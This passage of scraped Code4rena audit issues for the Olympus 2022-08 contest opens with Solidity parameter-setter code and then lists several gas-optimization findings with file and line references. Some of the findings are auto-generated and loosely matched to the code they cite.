onlyRole(\"operator_policy\") {         /// Set threshold factor on the range module         RANGE.setThresholdFactor(thresholdFactor_);     }      /// @inheritdoc IOperator     function setCushionFactor(uint32 cushionFactor_) external onlyRole(\"operator_policy\") {         /// Confirm factor is within allowed values         if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();          /// Set factor         _config.cushionFactor = cushionFactor_;          emit CushionFactorChanged(cushionFactor_);     }      /// @inheritdoc IOperator     function setCushionParams(         uint32 duration_,         uint32 debtBuffer_,         uint32 depositInterval_     ) external onlyRole(\"operator_policy\") {         /// Confirm values are valid         if (duration_ > uint256(7 days) || duration_ < uint256(1 days))             revert Operator_InvalidParams();         if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();         if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)             revert Operator_InvalidParams();          /// Update values         _config.cushionDuration = duration_;         _config.cushionDebtBuffer = debtBuffer_;         _config.cushionDepositInterval = depositInterval_;          emit CushionParamsChanged(duration_, debtBuffer_, depositInterval_);     }      /// @inheritdoc IOperator     function setReserveFactor(uint32 reserveFactor_) external onlyRole(\"operator_policy\") {         /// Confirm factor is within allowed values         if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();          /// Set factor         _config.reserveFactor = reserveFactor_;          emit Reserv"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/16", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## Unnecessary equals boolean   Boolean variables can be checked within conditionals directly without the use of equality operators to true/false.  ### Code instances:          Governance.sol, 223: if (proposalHasBeenActivated[proposalId_] == true) {         Governance.sol, 306: if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {         Operator.sol, 355: if (id_ == RANGE.market(false)) {         Operator.sol, 351: if (id_ == RANGE.market(true)) {    ## Change transferFrom to transfer  'transferFrom(address(this), *, **)' could be replaced by the following more gas efficient 'transfer(*, **)'                This replacement is more gas efficient and improves the code quality.  ### Code instance:          Governance.sol, 312 : VOTES.transferFrom(address(this), msg.sender, userVotes);    ## Caching array length can save gas   Caching the array length is more gas efficient. This is because access to a local variable in solidity is more efficient than query storage / calldata / memory. We recommend to change from:          for (uint256 i=0; i<array.length; i++) { ... }  to:       uint len = array.length       for (uint256 i=0; i<len; i++) { ... }   ### Code instance:          Governance.sol, instructions, 278    ## Unnecessary index init   In for loops you initialize the index to start from 0, but it already initialized to 0 in default and this assignment cost gas.  It is more clear and gas efficient to declare without assigning 0 and will have the same meaning:  ### Code instance:          Kernel.sol, 397    ## Storage double reading. Could save SLOAD  Reading a storage variable is gas costly (SLOAD). In cases of multiple read of a storage variable in the same scope, caching the first read (i.e saving as a local variable) can save gas and decrease the  overall gas uses. The following is a list of functions and the storage variables that you read twice:   ### Code instance:          PRICE.sol: nextObsIndex is read twice in getLastPrice    ## Rearrange state variables  You can change the order of the storage variables to decrease memory uses.  ### Code instance:  In Operator.sol,rearranging the storage fields can optimize to: 11 slots from: 13 slots. The new order of types (you choose the actual variables):         1. Status         2. Config         3. OlympusPrice         4. OlympusRange         5. OlympusTreasury         6. OlympusMinter         7. IBondAuctioneer         8. IBondCallback         9. ERC20         10. ERC20         11. uint32         12. uint8         13. uint8         14. bool         15. bool     ## Use bytes32 instead of string to save gas whenever possible       Use bytes32 instead of string to save gas whenever possible.     String is a dynamic data structure and therefore is more gas consuming then bytes32.       ### Code instance:          OlympusERC20.sol (L39), string internal UNAUTHORIZED = \"UNAUTHORIZED\";     ## Use != 0 instead of > 0   Using != 0 is slightly cheaper than > 0. (see https://github.com/code-423n4/2021-12-maple-findings/issues/75 for similar issue)   ### Code instance:          FullMath.sol, 35: change 'denominator > 0' to 'denominator != 0'    ## Unnecessary cast        ### Code instances:          Role Kernel.sol.grantRole - unnecessary casting Role(role_)         Kernel Kernel.sol._migrateKernel - unnecessary casting Kernel(newKernel_)    ## Use unchecked to save gas for certain additive calculations that cannot overflow   You can use unchecked in the following calculations since there is no risk to overflow:  ### Code instances:          Operator.sol (L#209) - if ( uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&         Operator.sol (L#215) - if ( uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&         Operator.sol (L#395) - payoutToken: ohm, quoteToken: reserve, callbackAddr: address(callback), capacityInQuote: false, capacity: marketCapacity, formattedInitialPrice: initialPrice, formattedMinimumPrice: minimumPrice, debtBuffer: config_.cushionDebtBuffer, vesting: uint48(0), conclusion: uint48(block.timestamp + config_.cushionDuration), depositInterval: config_.cushionDepositInterval, scaleAdjustment: scaleAdjustment         Governance.sol (L#212) - if (block.timestamp > proposal.submissionTimestamp + ACTIVATION_DEADLINE) {         Heart.sol (L#94) - if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle();          Operator.sol (L#447) - payoutToken: reserve, quoteToken: ohm, callbackAddr: address(callback), capacityInQuote: false, capacity: marketCapacity, formattedInitialPrice: initialPrice, formattedMinimumPrice: minimumPrice, debtBuffer: config_.cushionDebtBuffer, vesting: uint48(0), conclusion: uint48(block.timestamp + config_.cushionDuration), depositInterval: config_.cushionDepositInterval, scaleAdjustment: scaleAdjustment         Governance.sol (L#272) - if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_TIMELOCK) {         Governance.sol (L#227) - if (block.timestamp < activeProposal.activationTimestamp + GRACE_PERIOD) {    ## Inline one time use functions   The following functions are used exactly once. Therefore you can inline them and save gas and improve code clearness.       ### Code instances:          Kernel.sol, _upgradeModule         Kernel.sol, _activatePolicy         Kernel.sol, _reconfigurePolicies         FullMath.sol, mulDiv         Kernel.sol, _deactivatePolicy         Operator.sol, _addObservation         Kernel.sol, _pruneFromDependents         Kernel.sol, _migrateKernel         Kernel.sol, _installModule    ## Cache powers of 10 used several times  You calculate the power of 10 every time you use it instead of caching it once as a constant variable and using it instead.  Fix the following code lines:   ### Code instances:  Operator.sol, 374 : You should cache the used power of 10 as constant state variable since it's used several times (2):              uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);  Operator.sol, 419 : You should cache the used power of 10 as constant state variable since it's used several times (2):              uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;  Operator.sol, 783 : You should cache the used power of 10 as constant state variable since it's used several times (3):                      10**ohmDecimals * 10**PRICE.decimals(),  Operator.sol, 784 : You should cache the used power of 10 as constant state variable since it's used several times (3):                      10**reserveDecimals * RANGE.price(true, true)  Operator.sol, 752 : You should cache the used power of 10 as constant state variable since it's used several times (3):                  10**reserveDecimals * RANGE.price(true, false),  Operator.sol, 764 : You should cache the used power of 10 as constant state variable since it's used several times (3):                  10**reserveDecimals * RANGE.price(true, true)  Operator.sol, 763 : You should cache the used power of 10 as constant state variable since it's used several times (3):                  10**ohmDecimals * 10**PRICE.decimals(),  Operator.sol, 753 : You should cache the used power of 10 as constant state variable since it's used several times (3):                  10**ohmDecimals * 10**PRICE.decimals()  Operator.sol, 429 : You should cache the used power of 10 as constant state variable since it's used several times (2):              uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);  Operator.sol, 418 : You should cache the used power of 10 as constant state variable since it's used several times (2):              uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;     ## Upgrade pragma to at least 0.8.4   Using newer compiler versions and the optimizer gives gas optimizations and additional safety checks are available for free.  The advantages of versions 0.8.* over <0.8.0 are:          1. Safemath by default from 0.8.0 (can be more gas efficient than library based safemath.)         2. Low level inliner : from 0.8.2, leads to cheaper runtime gas. Especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions and if they are not inlined, they cost an additional 20 to 40 gas because of 2 extra jump instructions and additional stack operations needed for function calls.         3. Optimizer improvements in packed structs: Before 0.8.3, storing packed structs, in some cases used an additional storage read operation. After EIP-2929, if the slot was already cold, this means unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs.         4. Custom errors from 0.8.4, leads to cheaper deploy time cost and run time cost. Note: the run time cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.      ### Code instance:          OlympusERC20.sol    ## Do not cache msg.sender   We recommend not to cache msg.sender since calling it is 2 gas while reading a variable is more.   ### Code instance:          https://github.com/code-423n4/2022-08-olympus/tree/main/src/Kernel.sol#L219  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/10", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# gas optimization  ### Don't Initialize Variables with Default Value  ### examples ``` 2022-08-olympus\\src\\Kernel.sol::397 => for (uint256 i = 0; i < reqLength; ) { 2022-08-olympus\\src\\utils\\KernelUtils.sol::43 => for (uint256 i = 0; i < 5; ) { 2022-08-olympus\\src\\utils\\KernelUtils.sol::58 => for (uint256 i = 0; i < 32; ) { ```  ### Use != 0 instead of > 0 for Unsigned Integer Comparison  ### examples ``` 2022-08-olympus\\src\\policies\\Governance.sol::247 => if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { 2022-08-olympus\\src\\utils\\KernelUtils.sol::46 => if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only 2022-08-olympus\\src\\utils\\KernelUtils.sol::60 => if ((char < 0x61 || char > 0x7A) && char != 0x5f && char != 0x00) { ```  ### Long Revert Strings  ### examples ``` 2022-08-olympus\\src\\modules\\PRICE.sol::4 => import {AggregatorV2V3Interface} from \"interfaces/AggregatorV2V3Interface.sol\"; 2022-08-olympus\\src\\modules\\TRSRY.sol::5 => import {ReentrancyGuard} from \"solmate/utils/ReentrancyGuard.sol\"; 2022-08-olympus\\src\\modules\\VOTES.sol::18 => ERC20(\"OlympusDAO Dummy Voting Tokens\", \"VOTES\", 0) 2022-08-olympus\\src\\policies\\BondCallback.sol::5 => import {ReentrancyGuard} from \"solmate/utils/ReentrancyGuard.sol\"; 2022-08-olympus\\src\\policies\\Heart.sol::4 => import {ReentrancyGuard} from \"solmate/utils/ReentrancyGuard.sol\"; 2022-08-olympus\\src\\policies\\Heart.sol::7 => import {IOperator} from \"policies/interfaces/IOperator.sol\"; 2022-08-olympus\\src\\policies\\Operator.sol::4 => import {ReentrancyGuard} from \"solmate/utils/ReentrancyGuard.sol\"; 2022-08-olympus\\src\\policies\\Operator.sol::7 => import {IOperator} from \"policies/interfaces/IOperator.sol\"; ```  ### Use Shift Right/Left instead of Division/Multiplication if possible  ### examples ``` 2022-08-olympus\\src\\interfaces\\IBondAuctioneer.sol::41 => /// @dev                        Should be calculated as: (payoutDecimals - quoteDecimals) - ((payoutPriceDecimals - quotePriceDecimals) / 2) 2022-08-olympus\\src\\policies\\Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); 2022-08-olympus\\src\\policies\\Operator.sol::419 => uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; 2022-08-olympus\\src\\policies\\Operator.sol::420 => uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; 2022-08-olympus\\src\\policies\\Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); 2022-08-olympus\\src\\policies\\Operator.sol::786 => ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/6", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## [G-01] Don't Initialize Variables with Default Value  Uninitialized variables are assigned with the types default value. Explicitly initializing a variable with it's default value costs unnecesary gas.  ``` 2022-08-olympus/src/Kernel.sol::397 => for (uint256 i = 0; i < reqLength; ) { 2022-08-olympus/src/utils/KernelUtils.sol::43 => for (uint256 i = 0; i < 5; ) { 2022-08-olympus/src/utils/KernelUtils.sol::58 => for (uint256 i = 0; i < 32; ) { ```  ## [G-02] Cache Array Length Outside of Loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.  ``` 2022-08-olympus/src/policies/Governance.sol::278 => for (uint256 step; step < instructions.length; ) { ```  ## [G-03] Use Shift Right/Left instead of Division/Multiplication if possible  A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.  While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  ``` 2022-08-olympus/src/policies/Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); 2022-08-olympus/src/policies/Operator.sol::419 => uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; 2022-08-olympus/src/policies/Operator.sol::420 => uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; 2022-08-olympus/src/policies/Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); ```  ## [G-04] Using private rather than public for constants, saves gas  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  ``` 2022-08-olympus/src/modules/MINTR.sol::9 => OHM public immutable ohm; 2022-08-olympus/src/modules/RANGE.sol::68 => ERC20 public immutable ohm; 2022-08-olympus/src/modules/RANGE.sol::71 => ERC20 public immutable reserve; 2022-08-olympus/src/policies/Operator.sol::82 => ERC20 public immutable ohm; 2022-08-olympus/src/policies/Operator.sol::83 => uint8 public immutable ohmDecimals; 2022-08-olympus/src/policies/Operator.sol::85 => ERC20 public immutable reserve; 2022-08-olympus/src/policies/Operator.sol::86 => uint8 public immutable reserveDecimals; ```  ## [G-05] Functions guaranteed to revert when called by normal users can be marked payable  If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost  ``` 2022-08-olympus/src/Kernel.sol::76 => function changeKernel(Kernel newKernel_) external onlyKernel { 2022-08-olympus/src/Kernel.sol::105 => function INIT() external virtual onlyKernel {} 2022-08-olympus/src/Kernel.sol::126 => function setActiveStatus(bool activate_) external onlyKernel { 2022-08-olympus/src/Kernel.sol::235 => function executeAction(Actions action_, address target_) external onlyExecutor { 2022-08-olympus/src/Kernel.sol::439 => function grantRole(Role role_, address addr_) public onlyAdmin { 2022-08-olympus/src/Kernel.sol::451 => function revokeRole(Role role_, address addr_) public onlyAdmin { 2022-08-olympus/src/policies/BondCallback.sol::152 => function batchToTreasury(ERC20[] memory tokens_) external onlyRole(\"callback_admin\") { 2022-08-olympus/src/policies/BondCallback.sol::190 => function setOperator(Operator operator_) external onlyRole(\"callback_admin\") { 2022-08-olympus/src/policies/Heart.sol::130 => function resetBeat() external onlyRole(\"heart_admin\") { 2022-08-olympus/src/policies/Heart.sol::135 => function toggleBeat() external onlyRole(\"heart_admin\") { 2022-08-olympus/src/policies/Heart.sol::150 => function withdrawUnspentRewards(ERC20 token_) external onlyRole(\"heart_admin\") { 2022-08-olympus/src/policies/Operator.sol::195 => function operate() external override onlyWhileActive onlyRole(\"operator_operate\") { 2022-08-olympus/src/policies/Operator.sol::510 => function setThresholdFactor(uint256 thresholdFactor_) external onlyRole(\"operator_policy\") { 2022-08-olympus/src/policies/Operator.sol::516 => function setCushionFactor(uint32 cushionFactor_) external onlyRole(\"operator_policy\") { 2022-08-olympus/src/policies/Operator.sol::548 => function setReserveFactor(uint32 reserveFactor_) external onlyRole(\"operator_policy\") { 2022-08-olympus/src/policies/Operator.sol::618 => function regenerate(bool high_) external onlyRole(\"operator_admin\") { 2022-08-olympus/src/policies/Operator.sol::624 => function toggleActive() external onlyRole(\"operator_admin\") { 2022-08-olympus/src/policies/VoterRegistration.sol::45 => function issueVotesTo(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") { 2022-08-olympus/src/policies/VoterRegistration.sol::53 => function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") { ```  ## [G-06] Empty blocks should be removed or emit something  The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.   ``` 2022-08-olympus/src/Kernel.sol::85 => constructor(Kernel kernel_) KernelAdapter(kernel_) {} 2022-08-olympus/src/Kernel.sol::95 => function KEYCODE() public pure virtual returns (Keycode) {} 2022-08-olympus/src/Kernel.sol::100 => function VERSION() external pure virtual returns (uint8 major, uint8 minor) {} 2022-08-olympus/src/Kernel.sol::105 => function INIT() external virtual onlyKernel {} 2022-08-olympus/src/Kernel.sol::115 => constructor(Kernel kernel_) KernelAdapter(kernel_) {} 2022-08-olympus/src/Kernel.sol::139 => function configureDependencies() external virtual returns (Keycode[] memory dependencies) {} 2022-08-olympus/src/Kernel.sol::143 => function requestPermissions() external view virtual returns (Permissions[] memory requests) {} 2022-08-olympus/src/modules/INSTR.sol::20 => constructor(Kernel kernel_) Module(kernel_) {} 2022-08-olympus/src/modules/TRSRY.sol::45 => constructor(Kernel kernel_) Module(kernel_) {} 2022-08-olympus/src/modules/VOTES.sol::19 => {} 2022-08-olympus/src/policies/Governance.sol::59 => constructor(Kernel kernel_) Policy(kernel_) {} 2022-08-olympus/src/policies/PriceConfig.sol::15 => constructor(Kernel kernel_) Policy(kernel_) {} 2022-08-olympus/src/policies/TreasuryCustodian.sol::24 => constructor(Kernel kernel_) Policy(kernel_) {} 2022-08-olympus/src/policies/VoterRegistration.sol::16 => constructor(Kernel kernel_) Policy(kernel_) {} ```  ## [G-07] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead  When using elements that are smaller than 32 bytes, your contract\u2019s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  ``` 2022-08-olympus/src/modules/PRICE.sol::44 => uint32 public nextObsIndex; 2022-08-olympus/src/modules/PRICE.sol::47 => uint32 public numObservations; 2022-08-olympus/src/modules/PRICE.sol::59 => uint8 public constant decimals = 18; 2022-08-olympus/src/modules/PRICE.sol::84 => uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals(); 2022-08-olympus/src/modules/PRICE.sol::87 => uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals(); 2022-08-olympus/src/modules/PRICE.sol::127 => uint32 numObs = numObservations; 2022-08-olympus/src/modules/PRICE.sol::185 => uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1; 2022-08-olympus/src/policies/Operator.sol::83 => uint8 public immutable ohmDecimals; 2022-08-olympus/src/policies/Operator.sol::86 => uint8 public immutable reserveDecimals; 2022-08-olympus/src/policies/Operator.sol::89 => uint32 public constant FACTOR_SCALE = 1e4; 2022-08-olympus/src/policies/Operator.sol::485 => int8 decimals; 2022-08-olympus/src/policies/Operator.sol::665 => uint32 observe = _config.regenObserve; 2022-08-olympus/src/policies/interfaces/IOperator.sol::13 => uint32 cushionFactor; // percent of capacity to be used for a single cushion deployment, assumes 2 decimals (i.e. 1000 = 10%) 2022-08-olympus/src/policies/interfaces/IOperator.sol::14 => uint32 cushionDuration; // duration of a single cushion deployment in seconds 2022-08-olympus/src/policies/interfaces/IOperator.sol::15 => uint32 cushionDebtBuffer; // Percentage over the initial debt to allow the market to accumulate at any one time. Percent with 3 decimals, e.g. 1_000 = 1 %. See IBondAuctioneer for more info. 2022-08-olympus/src/policies/interfaces/IOperator.sol::16 => uint32 cushionDepositInterval; // Target frequency of deposits. Determines max payout of the bond market. See IBondAuctioneer for more info. 2022-08-olympus/src/policies/interfaces/IOperator.sol::17 => uint32 reserveFactor; // percent of reserves in treasury to be used for a single wall, assumes 2 decimals (i.e. 1000 = 10%) 2022-08-olympus/src/policies/interfaces/IOperator.sol::18 => uint32 regenWait; // minimum duration to wait to reinstate a wall in seconds 2022-08-olympus/src/policies/interfaces/IOperator.sol::19 => uint32 regenThreshold; // number of price points on other side of moving average to reinstate a wall 2022-08-olympus/src/policies/interfaces/IOperator.sol::20 => uint32 regenObserve; // number of price points to observe to determine regeneration 2022-08-olympus/src/policies/interfaces/IOperator.sol::31 => uint32 count; // current number of price points that count towards regeneration 2022-08-olympus/src/policies/interfaces/IOperator.sol::33 => uint32 nextObservation; // index of the next observation in the observations array ```  ## [G-08] Using bools for storage incurs overhead  Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled. Use uint256(1) and uint256(2) for true/false instead  ``` 2022-08-olympus/src/Kernel.sol::113 => bool public isActive; 2022-08-olympus/src/Kernel.sol::181 => mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions; 2022-08-olympus/src/Kernel.sol::194 => mapping(address => mapping(Role => bool)) public hasRole; 2022-08-olympus/src/Kernel.sol::197 => mapping(Role => bool) public isRole; 2022-08-olympus/src/modules/PRICE.sol::62 => bool public initialized; 2022-08-olympus/src/policies/BondCallback.sol::24 => mapping(address => mapping(uint256 => bool)) public approvedMarkets; 2022-08-olympus/src/policies/Governance.sol::105 => mapping(uint256 => bool) public proposalHasBeenActivated; 2022-08-olympus/src/policies/Governance.sol::117 => mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; 2022-08-olympus/src/policies/Heart.sol::33 => bool public active; 2022-08-olympus/src/policies/Operator.sol::63 => bool public initialized; 2022-08-olympus/src/policies/Operator.sol::66 => bool public active; ```  ## [G-09] <x> += <y> costs more gas than <x> = <x> + <y> for state variables  use <x> = <x> + <y> or <x> = <x> - <y> instead to save gas  ``` 2022-08-olympus/src/modules/PRICE.sol::136 => _movingAverage += (currentPrice - earliestPrice) / numObs; 2022-08-olympus/src/modules/PRICE.sol::138 => _movingAverage -= (earliestPrice - currentPrice) / numObs; 2022-08-olympus/src/modules/PRICE.sol::222 => total += startObservations_[i]; 2022-08-olympus/src/modules/TRSRY.sol::96 => reserveDebt[token_][msg.sender] += amount_; 2022-08-olympus/src/modules/TRSRY.sol::97 => totalDebt[token_] += amount_; 2022-08-olympus/src/modules/TRSRY.sol::115 => reserveDebt[token_][msg.sender] -= received; 2022-08-olympus/src/modules/TRSRY.sol::116 => totalDebt[token_] -= received; 2022-08-olympus/src/modules/TRSRY.sol::131 => if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt; 2022-08-olympus/src/modules/TRSRY.sol::132 => else totalDebt[token_] -= oldDebt - amount_; 2022-08-olympus/src/modules/VOTES.sol::56 => balanceOf[from_] -= amount_; 2022-08-olympus/src/modules/VOTES.sol::58 => balanceOf[to_] += amount_; 2022-08-olympus/src/policies/BondCallback.sol::143 => _amountsPerMarket[id_][0] += inputAmount_; 2022-08-olympus/src/policies/BondCallback.sol::144 => _amountsPerMarket[id_][1] += outputAmount_; 2022-08-olympus/src/policies/Governance.sol::194 => totalEndorsementsForProposal[proposalId_] -= previousEndorsement; 2022-08-olympus/src/policies/Governance.sol::198 => totalEndorsementsForProposal[proposalId_] += userVotes; 2022-08-olympus/src/policies/Governance.sol::252 => yesVotesForProposal[activeProposal.proposalId] += userVotes; 2022-08-olympus/src/policies/Governance.sol::254 => noVotesForProposal[activeProposal.proposalId] += userVotes; 2022-08-olympus/src/policies/Heart.sol::103 => lastBeat += frequency(); ```  ## [G-11] Use a more recent version of solidity  Use a solidity version of at least 0.8.2 to get compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value  ``` 2022-08-olympus/src/policies/interfaces/IHeart.sol::2 => pragma solidity >=0.8.0; 2022-08-olympus/src/policies/interfaces/IOperator.sol::2 => pragma solidity >=0.8.0; ```  ## [G-12] Prefix increments cheaper than Postfix increments  ++i costs less gas than i++, especially when it's used in for-loops (--i/i-- too) Saves 5 gas PER LOOP  ``` 2022-08-olympus/src/utils/KernelUtils.sol::49 => i++; 2022-08-olympus/src/utils/KernelUtils.sol::64 => i++; ```  ## [G-13] Don't compare boolean expressions to boolean literals  The extran comparison wastes gas if (<x> == true) => if (<x>), if (<x> == false) => if (!<x>)  ``` 2022-08-olympus/src/policies/Governance.sol::223 => if (proposalHasBeenActivated[proposalId_] == true) { 2022-08-olympus/src/policies/Governance.sol::306 => if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  ## [G-14] Public functions not called by the contract should be declared external instead  Contracts are allowed to override their parents' functions and change the visibility from external to public and can save gas by doing so.  ``` 2022-08-olympus/src/Kernel.sol::439 => function grantRole(Role role_, address addr_) public onlyAdmin { 2022-08-olympus/src/Kernel.sol::451 => function revokeRole(Role role_, address addr_) public onlyAdmin { 2022-08-olympus/src/modules/INSTR.sol::28 => function VERSION() public pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/INSTR.sol::37 => function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) { 2022-08-olympus/src/modules/MINTR.sol::20 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/MINTR.sol::33 => function mintOhm(address to_, uint256 amount_) public permissioned { 2022-08-olympus/src/modules/MINTR.sol::37 => function burnOhm(address from_, uint256 amount_) public permissioned { 2022-08-olympus/src/modules/PRICE.sol::108 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/RANGE.sol::110 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/TRSRY.sol::47 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/VOTES.sol::22 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/VOTES.sol::45 => function transfer(address to_, uint256 amount_) public pure override returns (bool) { 2022-08-olympus/src/policies/Governance.sol::145 => function getMetadata(uint256 proposalId_) public view returns (ProposalMetadata memory) { 2022-08-olympus/src/policies/Governance.sol::151 => function getActiveProposal() public view returns (ActivatedProposal memory) { ```  ## [G-15] Not using the named return variables when a function returns, wastes deployment gas  It is not necessary to have both a named return and a return statement.  ``` 2022-08-olympus/src/modules/INSTR.sol::28 => function VERSION() public pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/MINTR.sol::25 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/PRICE.sol::113 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/RANGE.sol::115 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/TRSRY.sol::51 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/VOTES.sol::27 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/policies/BondCallback.sol::177 => returns (uint256 in_, uint256 out_) ```  ## [G-16] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate  Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key's keccak256 hash (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  ``` 2022-08-olympus/src/modules/TRSRY.sol::33 => mapping(address => mapping(ERC20 => uint256)) public withdrawApproval; 2022-08-olympus/src/modules/TRSRY.sol::39 => mapping(ERC20 => mapping(address => uint256)) public reserveDebt; ```  ``` 2022-08-olympus/src/policies/Governance.sol::102 => mapping(uint256 => mapping(address => uint256)) public userEndorsementsForProposal; 2022-08-olympus/src/policies/Governance.sol::114 => mapping(uint256 => mapping(address => uint256)) public userVotesForProposal; 2022-08-olympus/src/policies/Governance.sol::117 => mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; ```  ## [G-17] Use assembly to check for address(0)  Saves 6 gas per instance if using assembly to check for address(0)  e.g. ``` assembly {  if iszero(_addr) {   mstore(0x00, \"zero address\")   revert(0x00, 0x20)  } } ```  instances:  ``` 2022-08-olympus/src/Kernel.sol::269 => if (address(getModuleForKeycode[keycode]) != address(0)) ```  ## [G-18] Using storage instead of memory for structs/arrays saves gas  When fetching data from a storage location, assigning the data to a memory variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional MLOAD rather than a cheap stack read.  Instead of declearing the variable with the memory keyword, declaring the variable with the storage keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/5", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "### [G-01] Using bools for storage incurs overhead.   #### Impact   ```     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use ```uint256(1)``` and ```uint256(2)``` for true/false to avoid a Gwarmaccess ([100 